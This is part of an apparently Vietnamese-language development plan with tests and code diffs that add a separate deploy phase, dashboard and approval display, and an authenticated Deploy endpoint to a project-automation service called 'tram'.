## Task 5: Pha deploy riêng và CLI

**Files:** `tests/test_tick_deploy.py`, `tests/test_noi_giao_viec.py`, `tram/giao_viec/tick.py`, `tram/giao_viec/luong.py`, `tram/giao_viec/lenh.py`

**Bằng chứng phiên này:** Test tick thuộc nhóm 60 xanh. Test luồng cũ giữ thay đổi ba pha của agent trước.

- [ ] Áp test, chạy đỏ trước mã.

### File `tests/test_tick_deploy.py`

```python
"""TM-3 (design D-6, D-9): pha thứ ba `vong_deploy` của vòng tick — luồng riêng `tram-giao-deploy`, khoá pha
`giao-deploy.lock`, lệnh `tram giao tick` chạy cả ba pha; estop vẫn đối soát chuỗi bỏ dở; một dự án lỗi không chặn."""
import subprocess
from types import SimpleNamespace

import tram.giao_viec.tick as tick
from giao_viec_gia import dung
from kho_phieu_gia import LUC
from tram.chu import estop
from tram.cli import main
from tram.giao_viec.luong import KHOA_DEPLOY, KHOA_GIT, chay_vong, giu_khoa
from tram.giao_viec.tick import mot_vong_tick, vong_deploy
from tram.tu_dong.luu import doc_trang_thai


def test_mot_vong_tick_chay_ca_pha_deploy_tru_khi_thu(tmp_path, monkeypatch):
    t, goi = dung(tmp_path), []
    (tmp_path / "repo-tram" / "du-an").mkdir(parents=True)
    (tmp_path / "repo-tram" / "du-an" / "hr-codex.yaml").write_text("ten: hr-codex\nbat_ghi: true\n")
    monkeypatch.setenv("TRAM_REPO", str(tmp_path / "repo-tram"))
    monkeypatch.setattr(tick, "buoc_deploy",
                        lambda bo, kho, da, *, bat_ghi: goi.append((da.ten, bat_ghi(da.ten))) or {"x": 1})
    assert mot_vong_tick(t.bo)["x"] == 1
    assert goi == [("hr-codex", True)]                  # bat_ghi đọc lại du-an/<ten>.yaml mỗi lần hỏi (Q4)
    (tmp_path / "repo-tram" / "du-an" / "hr-codex.yaml").write_text("bat_ghi: [hong]\n")
    assert mot_vong_tick(t.bo)["x"] == 1 and goi[-1] == ("hr-codex", False)     # yaml sai → False (INV-005)
    assert "x" not in mot_vong_tick(t.bo, thu=True) and len(goi) == 2


def test_estop_van_doi_soat_chuoi_bo_do(tmp_path):
    """Trạm chết giữa chuỗi rồi estop bật: vẫn ghi "không rõ" và tạm dừng — không chạy lệnh nào."""
    t = dung(tmp_path)
    with t.kho.giao_dich():
        t.kho.ghi_su_kien("hr-codex", "deploy.bat_dau", {"ma_thao_tac": "dp-1", "commit": t.k.main, "commit_truoc": "",
                                                         "nguon": "tu_dong"}, luc=LUC, tac_nhan="tram/tu-deploy")
    estop.bat("thử")
    assert vong_deploy(t.bo, bat_ghi=lambda ten: True) == {"deploy_khong_ro": 1}
    assert doc_trang_thai(t.kho.db, "hr-codex").tam_dung_du_an.ly_do == "khong-ro"
    assert vong_deploy(t.bo, bat_ghi=lambda ten: True) == {}


def test_mot_du_an_loi_dem_loi(tmp_path, monkeypatch):
    t = dung(tmp_path)
    monkeypatch.setattr(tick, "buoc_deploy",
                        lambda *a, **k: (_ for _ in ()).throw(subprocess.CalledProcessError(128, ["git"])))
    assert vong_deploy(t.bo) == {"loi": 1}


def test_khoa_pha_deploy_rieng(tmp_path):
    with giu_khoa(KHOA_DEPLOY) as duoc:
        assert duoc and chay_vong(KHOA_DEPLOY, lambda: {"x": 1}) is None
        assert chay_vong(KHOA_GIT, lambda: {"x": 1}) == {"x": 1}  # kiểm lại không phải chờ deploy


def test_cli_tick_ba_pha(tmp_path, monkeypatch, capsys):
    t = dung(tmp_path)
    t.bo.cac_du_an = lambda: []
    monkeypatch.setattr("tram.giao_viec.lenh._bo", lambda: (SimpleNamespace(bat=True), t.bo))
    assert main(["giao", "tick"]) == 0
    ra = capsys.readouterr().out
    assert "pha git: không có việc" in ra and "pha deploy: không có việc" in ra
```

### File `tests/test_noi_giao_viec.py`

```diff
--- a/tests/test_noi_giao_viec.py
+++ b/tests/test_noi_giao_viec.py
@@ -32,7 +32,7 @@
     try:
         assert pt.bo_giao is t.bo and nhan[0] is not None
         assert pt.chon_phieu("B/claude-1", None) is None and pt.con_hop_le_phieu(de_xuat()) is False
-        assert sorted(x.name for x in luong) == ["tram-giao-git", "tram-giao-nhanh"]
+        assert sorted(x.name for x in luong) == ["tram-giao-deploy", "tram-giao-git", "tram-giao-nhanh"]     # TM-3
     finally:
         dung_ev.set()
         for x in luong:
```

### File `tram/giao_viec/tick.py`

```diff
--- a/tram/giao_viec/tick.py
+++ b/tram/giao_viec/tick.py
@@ -5,13 +5,16 @@
   phải `xong` (bí, hết hạn mức, thu hồi), câu hỏi của agent, (1) hết ngân sách.
 - `vong_git` (có thể dài — kiểm lại tới 15 phút/lệnh): `git fetch` kho kiểm (có hạn giờ) · công việc `xong` (xét
   bàn giao, QC) · kiểm lại · cột 3 · thiếu môi trường kiểm. Estop bật → không làm gì.
-`mot_vong_tick` = hai pha nối tiếp (lệnh `tram giao tick`, test). Một dự án lỗi không chặn dự án khác."""
+- `vong_deploy` (TM-3, design D-6 — một chuỗi xấu nhất ~32 phút không chặn kiểm lại): `tram.deploy.vong`. Estop bật →
+  chỉ đối soát chuỗi bỏ dở và huỷ nút Deploy đang chờ.
+`mot_vong_tick` = ba pha nối tiếp (lệnh `tram giao tick`, test). Một dự án lỗi không chặn dự án khác."""
 import subprocess
 from collections import Counter
 from contextlib import closing

 from tram.beads.bd import LoiBd
 from tram.chu import estop
+from tram.deploy.vong import bat_ghi_an_toan, buoc_deploy
 from tram.giao_viec.git_kiem import fetch
 from tram.giao_viec.tick_github import buoc_github
 from tram.giao_viec.tick_doc import ghi_bead_dong, ghi_escalation_dong, mo_chu_ky_con_thieu
@@ -80,8 +83,13 @@
     return _vong(bo, lambda kho, da, luc, dem: _git(bo, kho, da, luc, dem))


+def vong_deploy(bo, *, bat_ghi=bat_ghi_an_toan) -> dict[str, int]:
+    return _vong(bo, lambda kho, da, luc, dem: dem.update(buoc_deploy(bo, kho, da, bat_ghi=bat_ghi)))
+
+
 def mot_vong_tick(bo, *, thu: bool = False) -> dict[str, int]:
     dem = Counter(vong_nhanh(bo, thu=thu))
     if not thu:
         dem.update(vong_git(bo))
+        dem.update(vong_deploy(bo))
     return {k: v for k, v in dem.items() if v}
```

### File `tram/giao_viec/luong.py`

```diff
--- a/tram/giao_viec/luong.py
+++ b/tram/giao_viec/luong.py
@@ -1,6 +1,7 @@
-"""Hai luồng tick trong tiến trình tram-api (spec 4 §10; G5 ≤ 3 phút): `tram-giao-nhanh` (escalation, câu hỏi, hết
-ngân sách — không bao giờ chờ Git hay lệnh kiểm) và `tram-giao-git` (fetch, xét `bao.xong`, kiểm lại tới 15 phút/lệnh,
-cột 3). Lịch theo nhịp cố định: vòng sau bắt đầu `chu_ky` giây sau khi vòng trước BẮT ĐẦU (vòng dài hơn thì chạy
+"""Ba luồng tick trong tiến trình tram-api (spec 4 §10; G5 ≤ 3 phút): `tram-giao-nhanh` (escalation, câu hỏi, hết
+ngân sách — không bao giờ chờ Git hay lệnh kiểm), `tram-giao-git` (fetch, xét `bao.xong`, kiểm lại tới 15 phút/lệnh,
+cột 3) và `tram-giao-deploy` (TM-3: chuỗi deploy → kiểm còn sống → lùi, tới ~32 phút — không chặn kiểm lại).
+Lịch theo nhịp cố định: vòng sau bắt đầu `chu_ky` giây sau khi vòng trước BẮT ĐẦU (vòng dài hơn thì chạy
 ngay) → bí/câu hỏi được xử lý trong ≤ chu_ky + một vòng nhanh. Khoá file (`flock`) mỗi pha giữ một vòng trên cả máy:
 `tram giao tick` chạy tay song song với tram-api không làm trùng việc (khoá tự nhả khi tiến trình chết)."""
 import fcntl
@@ -11,9 +12,9 @@
 from contextlib import contextmanager

 from tram.duong_dan import tram_home
-from tram.giao_viec.tick import vong_git, vong_nhanh
+from tram.giao_viec.tick import vong_deploy, vong_git, vong_nhanh

-KHOA_NHANH, KHOA_GIT = "giao-nhanh.lock", "giao-git.lock"
+KHOA_NHANH, KHOA_GIT, KHOA_DEPLOY = "giao-nhanh.lock", "giao-git.lock", "giao-deploy.lock"


 @contextmanager
@@ -52,7 +53,8 @@
 def bat_dau_luong_giao(bo, dung: threading.Event, *, chu_ky: float) -> list[threading.Thread]:
     ra = []
     for ten, khoa, pha in (("tram-giao-nhanh", KHOA_NHANH, lambda: vong_nhanh(bo)),
-                           ("tram-giao-git", KHOA_GIT, lambda: vong_git(bo))):
+                           ("tram-giao-git", KHOA_GIT, lambda: vong_git(bo)),
+                           ("tram-giao-deploy", KHOA_DEPLOY, lambda: vong_deploy(bo))):
         t = threading.Thread(target=lap, args=(dung, lambda k=khoa, p=pha: chay_vong(k, p), chu_ky, ten),
                              name=ten, daemon=True)
         t.start()
```

### File `tram/giao_viec/lenh.py`

```diff
--- a/tram/giao_viec/lenh.py
+++ b/tram/giao_viec/lenh.py
@@ -1,7 +1,7 @@
 """Lệnh `tram giao tick [--thu]`, `tram giao kho-kiem <du_an> [--dong-y]`, `tram giao kiem` (spec 4 §10; 4a-2),
 `tram giao mo-cong-kiem` (3C-D4: Đại ca mở lại cổng kiểm lại sau khi xem lý do đóng), `tram giao nghiem-thu-kiem`
 (harness S6, `lenh_nghiem_thu.py`) —
-chạy ở TÀI KHOẢN TRẠM. `tick` chạy hai pha như các luồng của tram-api, qua cùng khoá file (không trùng vòng đang chạy).
+chạy ở TÀI KHOẢN TRẠM. `tick` chạy ba pha như các luồng của tram-api, qua cùng khoá file (không trùng vòng đang chạy).
 Bộ giao việc tắt (`giao_viec.bat: false`) thì chỉ cho `tick --thu` (không ghi beads, không chạy lệnh)."""
 import argparse
 import sys
@@ -16,15 +16,15 @@


 def _tick(args) -> int:
-    from tram.giao_viec.luong import KHOA_GIT, KHOA_NHANH, chay_vong
-    from tram.giao_viec.tick import vong_git, vong_nhanh
+    from tram.giao_viec.luong import KHOA_DEPLOY, KHOA_GIT, KHOA_NHANH, chay_vong
+    from tram.giao_viec.tick import vong_deploy, vong_git, vong_nhanh
     cg, bo = _bo()
     if not cg.bat and not args.thu:
         print("giao_viec.bat đang tắt — chỉ chạy được `tram giao tick --thu`.")
         return 1
     pha = [("nhanh", KHOA_NHANH, lambda: vong_nhanh(bo, thu=args.thu))]
     if not args.thu:
-        pha.append(("git", KHOA_GIT, lambda: vong_git(bo)))
+        pha += [("git", KHOA_GIT, lambda: vong_git(bo)), ("deploy", KHOA_DEPLOY, lambda: vong_deploy(bo))]
     for ten, khoa, lam in pha:
         kq = chay_vong(khoa, lam)
         print(f"pha {ten}: " + ("đang có vòng khác chạy — bỏ qua" if kq is None else str(kq or "không có việc")))
@@ -83,7 +83,7 @@

 def them_lenh_giao(sub) -> None:
     g = sub.add_parser("giao", help="Bộ giao việc (phần 4)").add_subparsers(dest="lenh_giao", required=True)
-    t = g.add_parser("tick", help="Chạy một vòng tick (pha nhanh rồi pha Git)")
+    t = g.add_parser("tick", help="Chạy một vòng tick (pha nhanh, pha Git, rồi pha deploy)")
     t.add_argument("--thu", action="store_true", help="Chỉ ghi sự kiện suy từ beads: không ghi beads, không chạy lệnh")
     t.set_defaults(ham=_tick)
     k = g.add_parser("kho-kiem", help="Tạo/cập nhật kho kiểm của trạm từ remote dự án (liệt kê, chờ dong-y)")
```

- [ ] Áp mã, chạy xanh; lưu số đo thật, không dùng số dự kiến.

```bash
tests/chan_host/chay.sh -q tests/test_tick_deploy.py tests/test_noi_giao_viec.py
```

- [ ] Kiểm diff và trần dòng; giữ thay đổi chưa commit.

## Task 6: Hiển thị và Phê duyệt; Q15/D129

**Files:** `tests/test_suy_deploy.py`, `tests/test_api_tu_dong.py`, `tram/suy/deploy.py`, `tram/suy/tu_dong.py`, `tram/suy/phe_duyet.py`

**Bằng chứng phiên này:** Các ca hiển thị xanh trong nhóm 60. Nội dung hợp nhất giữ khoá `cho_dai_ca` của TM-2.

- [ ] Áp test, chạy đỏ trước mã.

### File `tests/test_suy_deploy.py`

```python
"""TM-3 (D96, D101; design D-5): trang Tự động thêm `san_sang`, `dang_deploy`, `lich_su`, `dem_hong`; trang Phê duyệt
thêm một dòng "sẵn sàng deploy" mỗi dự án và cộng vào số đếm — phía máy chủ, GET ai cũng xem, không lộ lệnh."""
from contextlib import closing

from api_gia import tao_app_gia
from asgi_gia import goi
from bd_gia import BdGia
from tram.su_kien.ghi_trong import ghi_trong_giao_dich
from tram.tu_dong.cai_dat import CaiDatTuDong
from tram.tu_dong.luu import doi_cai_dat, giao_dich

DU = CaiDatTuDong(lenh_deploy="/Users/Shared/tram-deploy/d.sh", lenh_kiem_song="/Users/Shared/tram-deploy/k.sh",
                  lenh_lui="/Users/Shared/tram-deploy/l.sh")


def _app(tmp_path):
    app, pt = tao_app_gia(tmp_path, {"repo-nhap": BdGia(), "hr-codex": BdGia()})
    pt.bat_ghi = lambda ten: ten == "repo-nhap"
    return app, pt


def _ghi(pt, ten, loai, du_lieu, bead=None, tac_nhan="tram/tu-deploy") -> int:
    with closing(pt.mo_kho()) as kho, giao_dich(kho.db):
        return ghi_trong_giao_dich(kho.db, ten, loai, du_lieu, bead_id=bead, tac_nhan=tac_nhan,
                                   luc="2026-10-18T21:52:00Z")


def _merge(pt, ten, i, mc) -> int:
    return _ghi(pt, ten, "pr.da_merge", {"commit": f"c{i}", "merge_commit": mc, "pr": i, "ma_thao_tac": f"pr-{i}"},
                f"rn-{i}", "tram/giao-viec")


def test_mac_dinh_khong_co_gi(tmp_path):
    app, _ = _app(tmp_path)
    ct = goi(app, "GET", "/api/du-an/repo-nhap/tu-dong").json()
    assert (ct["san_sang"], ct["dang_deploy"], ct["lich_su"], ct["dem_hong"]) == (None, None, [], 0)
    assert goi(app, "GET", "/api/phe-duyet").json()["so"] == 0
    tt = goi(app, "GET", "/api/tu-dong").json()["du_an"]
    assert [(d["ten"], d["san_sang"], d["dem_hong"]) for d in tt] == [("hr-codex", False, 0), ("repo-nhap", False, 0)]


def test_san_sang_o_trang_tu_dong_va_phe_duyet(tmp_path):
    """Scenario "Hiện ở trang Phê duyệt", "Ba lần merge chờ deploy" (gồm 2 việc), "Đại ca gộp tay"."""
    app, pt = _app(tmp_path)
    with closing(pt.mo_kho()) as kho:
        doi_cai_dat(kho.db, "repo-nhap", lambda c: DU, tac_nhan="dai-ca/dashboard")
    bao = [_merge(pt, "repo-nhap", 11, "9be2"), _merge(pt, "repo-nhap", 12, "a41c")]
    _ghi(pt, "repo-nhap", "deploy.san_sang", {"commit": "a41c", "so_merge": 2, "bao_gom": bao, "cho": []})
    ct = goi(app, "GET", "/api/du-an/repo-nhap/tu-dong").json()
    ss = {"commit": "a41c", "so_merge": 2, "bead_ids": ["rn-11", "rn-12"], "luc": "2026-10-18T21:52:00Z",
          "commit_dang_chay": None}
    assert ct["san_sang"] == ss and ct["dang_deploy"] is None and ct["dem_hong"] == 0
    assert [x["loai"] for x in ct["lich_su"]] == ["san_sang"]       # hai merge gộp tay: nằm trong "gồm 2 việc"
    pd = goi(app, "GET", "/api/phe-duyet").json()
    assert pd["so"] == 1 and pd["muc"] == [{"loai": "san-sang-deploy", "du_an": "repo-nhap", "bead_id": None,
                                            "tieu_de": "", "uu_tien": None, "updated_at": ss["luc"],
                                            "chi_tiet": ss}]
    tt = {d["ten"]: d for d in goi(app, "GET", "/api/tu-dong").json()["du_an"]}
    assert (tt["repo-nhap"]["san_sang"], tt["hr-codex"]["san_sang"]) == (True, False)


def test_thieu_lenh_khong_co_dong_phe_duyet(tmp_path):
    """D96: chỉ khi dự án khai đủ 3 lệnh."""
    app, pt = _app(tmp_path)
    i = _merge(pt, "hr-codex", 1, "m1")
    _ghi(pt, "hr-codex", "deploy.san_sang", {"commit": "m1", "so_merge": 1, "bao_gom": [i], "cho": []})
    assert goi(app, "GET", "/api/du-an/hr-codex/tu-dong").json()["san_sang"] is None
    assert goi(app, "GET", "/api/phe-duyet").json()["so"] == 0


def test_lich_su_va_dem_hong_khong_lo_lenh(tmp_path):
    """Scenario "Lệnh deploy in ra token": dashboard chỉ hiện "hỏng · mã thoát 1 · 42 giây"."""
    app, pt = _app(tmp_path)
    with closing(pt.mo_kho()) as kho:
        doi_cai_dat(kho.db, "repo-nhap", lambda c: DU, tac_nhan="dai-ca/dashboard")
    _ghi(pt, "repo-nhap", "deploy.bat_dau", {"ma_thao_tac": "dp-1", "commit": "c0d9", "commit_truoc": "5d3e",
                                             "nguon": "tu_dong"})
    _ghi(pt, "repo-nhap", "deploy.lenh", {"ma_thao_tac": "dp-1", "buoc": "deploy", "ma_thoat": 1, "giay": 42,
                                          "het_gio": False, "digest_log": "sha256:ab"})
    assert goi(app, "GET", "/api/du-an/repo-nhap/tu-dong").json()["dang_deploy"]["trang_thai"] == "chay"
    _ghi(pt, "repo-nhap", "deploy.xong", {"ma_thao_tac": "dp-1", "ket_qua": "da_lui", "dem_hong": 1})
    r = goi(app, "GET", "/api/du-an/repo-nhap/tu-dong")
    ct = r.json()
    assert ct["dem_hong"] == 1 and ct["dang_deploy"] is None
    assert ct["lich_su"] == [{"luc": "2026-10-18T21:52:00Z", "loai": "deploy_lui", "bead_id": None, "commit": "c0d9",
                              "chi_tiet": "deploy: mã thoát 1 · 42 giây (bản trước 5d3e)", "ai": "tu_deploy"}]
    assert goi(app, "GET", "/api/tu-dong").json()["du_an"][1]["dem_hong"] == 1
    assert "sha256:ab" not in r.body.decode() and "commit_truoc" not in r.body.decode()
```

### File `tests/test_api_tu_dong.py`

```diff
--- a/tests/test_api_tu_dong.py
+++ b/tests/test_api_tu_dong.py
@@ -37,9 +37,12 @@
     tt = goi(app, "GET", "/api/tu-dong").json()
     assert tt["chi_tam_dung"] is True and tt["kenh_ghi"] == "header" and tt["la_dai_ca"] is False
     assert tt["tam_dung_tram"] is None and tt["estop"] is False
+    tm3 = {"san_sang": False, "dem_hong": 0}                          # TM-3 thêm hai khoá (hợp đồng TM-4)
     assert tt["du_an"] == [
-        {"ten": "hr-codex", "bat_ghi": False, "tu_merge": False, "tu_deploy": False, "du_lenh": False, "tam_dung": None},
-        {"ten": "repo-nhap", "bat_ghi": True, "tu_merge": False, "tu_deploy": False, "du_lenh": False, "tam_dung": None}]
+        {"ten": "hr-codex", "bat_ghi": False, "tu_merge": False, "tu_deploy": False, "du_lenh": False, "tam_dung": None,
+         **tm3},
+        {"ten": "repo-nhap", "bat_ghi": True, "tu_merge": False, "tu_deploy": False, "du_lenh": False, "tam_dung": None,
+         **tm3}]
     ct = _xem(app)
     assert ct["cai_dat"] == {"tu_merge": False, "tu_deploy": False, "dieu_kien": {"ci": True, "cot": True,
                              "hang_rao": True}, "lenh": {"deploy": "", "kiem_song": "", "lui": ""}}
```

### File `tram/suy/deploy.py`

```python
"""Khoá hiển thị TM-3 cho trang Tự động và Phê duyệt (D129: cùng tuyến ghi Deploy)."""
from tram.deploy.hien_thi import dang_deploy, lich_su, san_sang
from tram.deploy.trang_thai import dem_hong, doc_su_kien
from tram.tu_dong.luu import doc_trang_thai


def san_sang_du_an(db, ten):
    return san_sang(doc_su_kien(db, ten)) if doc_trang_thai(db, ten).cai_dat.du_lenh else None


def tom_tat_deploy(db, ten):
    return {"san_sang": san_sang_du_an(db, ten) is not None, "dem_hong": dem_hong(doc_su_kien(db, ten))}


def chi_tiet_deploy(db, ten):
    ds = doc_su_kien(db, ten)
    return {"san_sang": san_sang_du_an(db, ten), "dang_deploy": dang_deploy(ds),
            "lich_su": lich_su(ds), "dem_hong": dem_hong(ds)}


def muc_san_sang(du_an, kho):
    from tram.suy.phe_duyet import _muc
    ss = san_sang_du_an(kho.db, du_an)
    return [] if ss is None else [{**_muc("san-sang-deploy", du_an, None, ss), "updated_at": ss["luc"]}]
```

### File `tram/suy/tu_dong.py`

```diff
--- a/tram/suy/tu_dong.py
+++ b/tram/suy/tu_dong.py
@@ -1,6 +1,7 @@
 """Trạng thái hiển thị của tự merge / tự deploy (`dieu-khien-tu-dong`, design D-5) — tính lúc đọc từ sự kiện.
 TM-2 (việc chờ kèm lý do), TM-3 (sẵn sàng deploy, lịch sử, bộ đếm hỏng) THÊM khoá vào hai bảng này, không đổi khoá
 có sẵn."""
+from tram.suy.deploy import chi_tiet_deploy, tom_tat_deploy
 from tram.su_kien.kho import KhoSuKien
 from tram.suy.tu_merge import TieuDe, cho_dai_ca  # TM-2
 from tram.tu_dong.cai_dat import KHOA_CUNG, sang_api
@@ -20,7 +21,8 @@
 def tom_tat_du_an(kho: KhoSuKien, ten: str, *, bat_ghi: bool) -> dict:
     tt = doc_trang_thai(kho.db, ten)
     return {"ten": ten, "bat_ghi": bat_ghi, "tu_merge": tt.cai_dat.tu_merge, "tu_deploy": tt.cai_dat.tu_deploy,
-            "du_lenh": tt.cai_dat.du_lenh, "tam_dung": tam_dung_api(tt.tam_dung_du_an)}
+            "du_lenh": tt.cai_dat.du_lenh, "tam_dung": tam_dung_api(tt.tam_dung_du_an),
+            **tom_tat_deploy(kho.db, ten)}


 def chi_tiet_du_an(kho: KhoSuKien, ten: str, *, bat_ghi: bool, tieu_de: TieuDe = dict) -> dict:
@@ -28,4 +30,5 @@
     return {"du_an": ten, "bat_ghi": bat_ghi, "cai_dat": sang_api(tt.cai_dat), "du_lenh": tt.cai_dat.du_lenh,
             "phien_ban": tt.phien_ban, "tam_dung": tam_dung_api(tt.tam_dung_du_an), "khoa_cung": list(KHOA_CUNG),
             "lich_su_doi": lich_su_doi(kho.db, ten),
-            "cho_dai_ca": cho_dai_ca(kho.db, ten, tieu_de) if tt.cai_dat.tu_merge else []}   # TM-2: tắt → []
+            "cho_dai_ca": cho_dai_ca(kho.db, ten, tieu_de) if tt.cai_dat.tu_merge else [],  # TM-2: tắt → []
+            **chi_tiet_deploy(kho.db, ten)}
```

### File `tram/suy/phe_duyet.py`

```diff
--- a/tram/suy/phe_duyet.py
+++ b/tram/suy/phe_duyet.py
@@ -7,8 +7,9 @@
 from tram.suy.phe_duyet_bi import gan_bi
 from tram.suy.phe_duyet_spec import bo_sung_spec
 from tram.suy.pr_tram import pr_tram
+from tram.suy.deploy import muc_san_sang

-THU_TU = ("escalation", "decision", "co-do", "he", "cho-review", "spec", "feature-xong")
+THU_TU = ("escalation", "decision", "co-do", "he", "cho-review", "spec", "feature-xong", "san-sang-deploy")
 HET_BO_QUA = ("cham_cot.bo_qua", "cham_cot.ket_qua", "cham_cot.thu_lai")
 LOI_NHO = {"llm": "nho.loi_llm", "embedder": "nho.loi_embedder"}   # memory 1b: nạp ký ức đứng (plan 1b-1 G9)

@@ -100,5 +101,6 @@
         beads = theo_du_an.get(du_an, [])
         muc = gan_bi(du_an, gan_pr_tram(du_an, muc_tu_beads(du_an, beads), kho), kho, {b.id: b for b in beads})  # 2f T4
         ra += bo_sung_spec(du_an, muc, beads, kho) + muc_he(du_an, kho, {b.id: b for b in beads})
+        ra += muc_san_sang(du_an, kho)
     return sorted(ra, key=lambda m: (THU_TU.index(m["loai"]), 9 if m["uu_tien"] is None else m["uu_tien"],
                                      m["updated_at"] or "", m["du_an"], m["bead_id"] or ""))
```

- [ ] Áp mã, chạy xanh; lưu số đo thật, không dùng số dự kiến.

```bash
tests/chan_host/chay.sh -q tests/test_suy_deploy.py tests/test_api_tu_dong.py
```

- [ ] Kiểm diff và trần dòng; giữ thay đổi chưa commit.

## Task 7: Tuyến Deploy mới; Q7/D116/D129

**Files:** `tests/test_api_deploy.py`, `tram/api/tuyen_deploy.py`, `tram/api/app.py`, `tram/thao_tac/deploy.py`

**Bằng chứng phiên này:** Đỏ thực trên mã cũ: merge mới chưa vào hàng chờ vẫn trả 200. Sau sửa nhóm API xanh; thêm test đỉnh Git đổi mà chưa có sự kiện.

- [ ] Áp test, chạy đỏ trước mã.

### File `tests/test_api_deploy.py`

```python
"""TM-3: nút Deploy của Đại ca `POST /api/du-an/{ten}/tu-dong/deploy` (tu-deploy "Nút Deploy của Đại ca";
dieu-khien-tu-dong "Estop dừng cả tự merge và tự deploy", "Deploy tay khi dự án tạm dừng", "Cửa ghi còn tạm"; D87,
D97 luật 3, D116, D129 — cùng tuyến cho nút ở trang Tự động và ở dòng Phê duyệt; Codex Q7). Chỉ ghi yêu cầu — không
lệnh nào chạy trong tram-api."""
import json
from contextlib import closing

import pytest

from api_gia import DAI_CA, tao_app_gia
from asgi_gia import goi
from bd_gia import BdGia
from tram.api.kenh_ghi import KenhUnix
from tram.chu import estop
from tram.su_kien.ghi_trong import ghi_trong_giao_dich
from tram.su_kien.kho import KhoSuKien
from tram.tu_dong.cai_dat import CaiDatTuDong
from tram.tu_dong.luu import doi_cai_dat, ghi_tam_dung, giao_dich

M4, M5 = "4" * 40, "5" * 40
DP = "/api/du-an/repo-nhap/tu-dong/deploy"
DU = CaiDatTuDong(lenh_deploy="/Users/Shared/tram-deploy/d.sh", lenh_kiem_song="/Users/Shared/tram-deploy/k.sh",
                  lenh_lui="/Users/Shared/tram-deploy/l.sh")


@pytest.fixture(autouse=True)
def dinh_gia(monkeypatch):
    monkeypatch.setattr("tram.api.tuyen_deploy.doc_dinh", lambda ten: M5)


def _app(tmp_path, *, unix=True, cd=DU, san_sang=True):
    app, pt = tao_app_gia(tmp_path, {"repo-nhap": BdGia(), "hr-codex": BdGia()})
    pt.bat_ghi = lambda ten: ten == "repo-nhap"
    with closing(pt.mo_kho()) as kho:
        for ten in ("repo-nhap", "hr-codex"):
            doi_cai_dat(kho.db, ten, lambda c: cd, tac_nhan="dai-ca/dashboard")
            if san_sang:
                i = _ghi(kho, ten, "pr.da_merge", {"commit": "c7", "merge_commit": M5, "ma_thao_tac": "pr-7"}, "rn-7")
                _ghi(kho, ten, "deploy.san_sang", {"commit": M5, "so_merge": 1, "bao_gom": [i], "cho": []})
    if unix:
        app.state.kenh_ghi = "unix-socket"
        return KenhUnix(app), pt
    return app, pt


def _ghi(kho, ten, loai, du_lieu, bead=None) -> int:
    with giao_dich(kho.db):
        return ghi_trong_giao_dich(kho.db, ten, loai, du_lieu, bead_id=bead, tac_nhan="tram/tu-deploy",
                            luc="2026-10-18T10:00:00Z")


def _than(ma="ma-api-dp-001", commit=M5):
    return {"ma_thao_tac": ma, "expected_version": "", "expected_commit": commit}


def _yeu_cau(pt) -> list[dict]:
    with closing(pt.mo_kho()) as kho:
        return [json.loads(d) for (d,) in kho.db.execute("SELECT du_lieu FROM su_kien WHERE loai='deploy.yeu_cau'")]


def test_dai_ca_bam_deploy_mot_lan_theo_ma(tmp_path):
    """Scenario "Đại ca bấm Deploy": ghi yêu cầu cho `m5`, hàng "sẵn sàng" chuyển "đang deploy"; gửi lại cùng mã."""
    app, pt = _app(tmp_path)
    r = goi(app, "POST", DP, json_body=_than(), headers=DAI_CA)
    assert r.status == 200 and r.json() == {"ket_qua": {"deploy.yeu_cau": {"commit": M5}}, "lap_lai": False}
    ct = goi(app, "GET", "/api/du-an/repo-nhap/tu-dong").json()
    assert ct["san_sang"] is None and ct["dang_deploy"]["trang_thai"] == "cho" and ct["dang_deploy"]["commit"] == M5
    assert goi(app, "POST", DP, json_body=_than(), headers=DAI_CA).json()["lap_lai"] is True
    assert _yeu_cau(pt) == [{"ma_thao_tac": "ma-api-dp-001", "commit": M5, "nguon": "dai_ca"}]
    r = goi(app, "POST", DP, json_body=_than("ma-api-dp-002"), headers=DAI_CA)       # đã có yêu cầu chờ
    assert r.status == 422 and "Đang có một lần deploy" in r.json()["loi"]


def test_bam_tren_man_hinh_cu_409(tmp_path):
    """Scenario "Bấm trên màn hình cũ": commit mới nhất `m5`, Đại ca bấm với `m4` → 409, không ghi gì."""
    app, pt = _app(tmp_path)
    r = goi(app, "POST", DP, json_body=_than(commit=M4), headers=DAI_CA)
    assert r.status == 409 and r.json()["loi"].startswith("Có bản mới hơn — tải lại") and "đã đổi" in r.json()["loi"]
    assert _yeu_cau(pt) == []
    assert goi(app, "POST", DP, json_body=_than(), headers=DAI_CA).status == 200     # cùng mã, commit đúng: được


def test_co_merge_moi_chua_vao_ban_cho_thi_409(tmp_path):
    """Codex Q7: hàng "sẵn sàng" đang là m5 nhưng m6 đã merge mà vòng deploy chưa kịp ghi nhận → bấm với m5 → 409
    "Có bản mới hơn — tải lại", không ghi yêu cầu (không lặng lẽ nhận bản đã cũ)."""
    app, pt = _app(tmp_path)
    with closing(pt.mo_kho()) as kho:
        _ghi(kho, "repo-nhap", "pr.da_merge", {"commit": "c8", "merge_commit": "6" * 40, "ma_thao_tac": "pr-8"}, "rn-8")
    r = goi(app, "POST", DP, json_body=_than(), headers=DAI_CA)
    assert r.status == 409 and r.json()["loi"].startswith("Có bản mới hơn — tải lại") and "đã đổi" in r.json()["loi"]
    assert _yeu_cau(pt) == []


@pytest.mark.parametrize("h", [{}, {**DAI_CA, "Tailscale-User-Login": "nguoi-la@example.com"},
                               {k: v for k, v in DAI_CA.items() if k != "X-Tram"},
                               {**DAI_CA, "Origin": "https://evil.example"}])
def test_thieu_hoac_gia_danh_tinh_403(tmp_path, h):
    """Scenario "Yêu cầu không mang danh tính Đại ca": 403, không ghi yêu cầu."""
    app, pt = _app(tmp_path)
    assert goi(app, "POST", DP, json_body=_than(), headers=h).status == 403 and _yeu_cau(pt) == []


def test_kenh_header_403(tmp_path):
    """D87 — Scenario "Kênh header": bấm Deploy → 403 "cần kênh ghi unix-socket"."""
    app, pt = _app(tmp_path, unix=False)
    r = goi(app, "POST", DP, json_body=_than(), headers=DAI_CA)
    assert r.status == 403 and r.json()["detail"].startswith("cần kênh ghi unix-socket") and _yeu_cau(pt) == []


def test_estop_va_khoa_chung_422(tmp_path):
    """Scenario "Estop bật" (nút Deploy bị khoá), "Dự án chưa khai lệnh lùi", D116 `bat_ghi: false`."""
    app, pt = _app(tmp_path)
    estop.bat("thử")
    r = goi(app, "POST", DP, json_body=_than(), headers=DAI_CA)
    assert (r.status, r.json()["loi"]) == (422, "Estop đang bật")
    estop.tat()
